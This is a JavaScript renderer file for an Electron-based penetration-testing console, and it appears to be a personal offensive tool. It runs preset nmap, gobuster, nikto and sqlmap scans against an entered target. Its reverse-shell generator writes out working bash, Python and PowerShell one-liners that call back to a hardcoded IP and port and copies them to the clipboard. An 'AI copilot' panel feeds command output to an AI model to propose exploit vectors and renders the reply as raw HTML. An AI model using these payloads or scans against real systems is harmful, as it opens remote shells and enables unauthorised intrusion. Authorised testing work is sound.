const { ipcRenderer } = require('electron');

const termOutput = document.getElementById('term-output');
const termInput = document.getElementById('term-input');
const targetHost = document.getElementById('target-host');
const cmdStatus = document.getElementById('cmd-status');
const aiMessages = document.getElementById('ai-messages');
const aiInput = document.getElementById('ai-input');

let lastCommandOutput = '';

function appendTerm(text, isError = false) {
  termOutput.textContent += text;
  termOutput.scrollTop = termOutput.scrollHeight;
  lastCommandOutput += text;
  if (lastCommandOutput.length > 5000) {
    lastCommandOutput = lastCommandOutput.substring(lastCommandOutput.length - 5000);
  }
}

// ── Streaming Command IPC ─────────────────────────────────────────────
ipcRenderer.on('cmd-output', (event, data) => {
  if (data.type === 'start') {
    cmdStatus.textContent = 'RUNNING...';
    cmdStatus.style.color = 'var(--gold)';
    appendTerm(`\n[+] EXECUTING: ${data.cmd}\n------------------------------------------------------------\n`);
  } else if (data.type === 'stdout') {
    appendTerm(data.text);
  } else if (data.type === 'stderr') {
    appendTerm(data.text, true);
  } else if (data.type === 'exit') {
    cmdStatus.textContent = data.code === 0 ? 'COMPLETED' : `EXITED (${data.code})`;
    cmdStatus.style.color = data.code === 0 ? 'var(--accent)' : 'var(--secondary)';
    appendTerm(`\n[✓] Process terminated with code: ${data.code}\n`);
  } else if (data.type === 'error') {
    cmdStatus.textContent = 'ERROR';
    cmdStatus.style.color = 'var(--secondary)';
    appendTerm(`\n[-] Execution error: ${data.text}\n`, true);
  }
});

function executeCommand(cmd) {
  if (!cmd.trim()) return;
  ipcRenderer.send('run-cmd', cmd);
}

document.getElementById('btn-term-send').addEventListener('click', () => {
  const cmd = termInput.value;
  termInput.value = '';
  executeCommand(cmd);
});

termInput.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    const cmd = termInput.value;
    termInput.value = '';
    executeCommand(cmd);
  }
});

document.getElementById('btn-stop-cmd').addEventListener('click', () => {
  ipcRenderer.send('stop-cmd');
  cmdStatus.textContent = 'STOPPED';
  cmdStatus.style.color = 'var(--secondary)';
  appendTerm('\n[!] Execution cancelled by user.\n');
});

// ── Preset Tactical Commands ──────────────────────────────────────────
window.runPreset = function(type) {
  const target = targetHost.value.trim() || '127.0.0.1';
  let cmd = '';
  switch (type) {
    case 'nmap_fast':
      cmd = `nmap -sS -T4 -F -Pn ${target}`;
      break;
    case 'nmap_full':
      cmd = `nmap -sV -sC -Pn -T4 -p- ${target}`;
      break;
    case 'gobuster':
      cmd = `gobuster dir -u http://${target} -w /usr/share/wordlists/dirb/common.txt -t 20 -q`;
      break;
    case 'nikto':
      cmd = `nikto -h http://${target} -Tuning 123b`;
      break;
    case 'sqlmap':
      cmd = `sqlmap -u "http://${target}/" --batch --crawl=2 --level=2 --risk=2`;
      break;
  }
  if (cmd) executeCommand(cmd);
};

window.genRevShell = function(lang) {
  const lhost = '192.168.122.188'; // Current local IP default
  const lport = '4444';
  let payload = '';

  if (lang === 'bash') {
    payload = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
  } else if (lang === 'python') {
    payload = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`;
  } else if (lang === 'powershell') {
    payload = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
  }

  appendTerm(`\n[+] GENERATED ${lang.toUpperCase()} REVERSE SHELL:\n${payload}\n[i] Listener trigger: nc -lvnp ${lport}\n`);
  navigator.clipboard.writeText(payload).catch(() => {});
};

window.launchExt = function(tool) {
  ipcRenderer.send('launch-external', tool);
  appendTerm(`\n[⚡] Launched external workstation GUI: ${tool}\n`);
};

document.getElementById('btn-quick-scan').addEventListener('click', () => {
  window.runPreset('nmap_fast');
});

// ── AI Copilot ────────────────────────────────────────────────────────
function sendAiQuery() {
  const prompt = aiInput.value.trim();
  if (!prompt) return;
  aiInput.value = '';

  // Append user bubble
  const userBubble = document.createElement('div');
  userBubble.className = 'ai-bubble user';
  userBubble.textContent = prompt;
  aiMessages.appendChild(userBubble);

  // Append thinking bubble
  const agentBubble = document.createElement('div');
  agentBubble.className = 'ai-bubble agent';
  agentBubble.innerHTML = '<i>Analyzing telemetry and generating exploit vector...</i>';
  aiMessages.appendChild(agentBubble);
  aiMessages.scrollTop = aiMessages.scrollHeight;

  ipcRenderer.send('query-ai', {
    prompt: prompt,
    context: lastCommandOutput
  });

  ipcRenderer.once('ai-response', (event, data) => {
    if (data.success) {
      agentBubble.innerHTML = data.response.replace(/\n/g, '<br>').replace(/`([^`]+)`/g, '<code style="background:rgba(0,0,0,0.5); padding:1px 4px; border-radius:3px; color:var(--primary);">$1</code>');
    } else {
      agentBubble.textContent = `[!] Error: ${data.error}`;
    }
    aiMessages.scrollTop = aiMessages.scrollHeight;
  });
}

document.getElementById('btn-ai-send').addEventListener('click', sendAiQuery);
aiInput.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') sendAiQuery();
});
